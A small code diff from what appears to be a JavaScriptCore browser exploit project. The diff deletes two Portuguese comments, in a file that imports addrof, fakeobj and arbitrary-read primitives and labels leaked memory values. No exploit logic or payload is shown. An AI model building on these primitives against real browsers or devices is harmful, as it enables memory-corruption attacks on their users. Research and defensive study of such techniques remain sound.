@@ -6,7 +6,7 @@ import {
 } from './script3/testArrayBufferVictimCrash.mjs';
 import { AdvancedInt64, setLogFunction, toHex, isAdvancedInt64Object } from './utils.mjs'; // Importar toHex e isAdvancedInt64Object
 import { JSC_OFFSETS } from './config.mjs';
-import { addrof_core, initCoreAddrofFakeobjPrimitives, arb_read, fakeobj_core } from './core_exploit.mjs'; // Importar fakeobj_core
+import { addrof_core, initCoreAddrofFakeobjPrimitives, arb_read, fakeobj_core } from './core_exploit.mjs';
 
 // --- Local DOM Elements Management ---
 const elementsCache = {};
@@ -151,7 +151,7 @@ async function testIsolatedAddrofFakeobjCoreAndDump(logFn, pauseFn, JSC_OFFSETS_
                 let guess = "";
 
                 // Tentativa de adivinhar o conteúdo
-                if (isAdvancedInt64Object(val)) { // isAdvancedInt64Object AGORA ESTÁ IMPORTADO!
+                if (isAdvancedInt64Object(val)) {
                     if (val.equals(AdvancedInt64.Zero)) {
                         guess = "Zero/Null";
                     } else if (val.high() === 0x7ff80000 && val.low() === 0) {
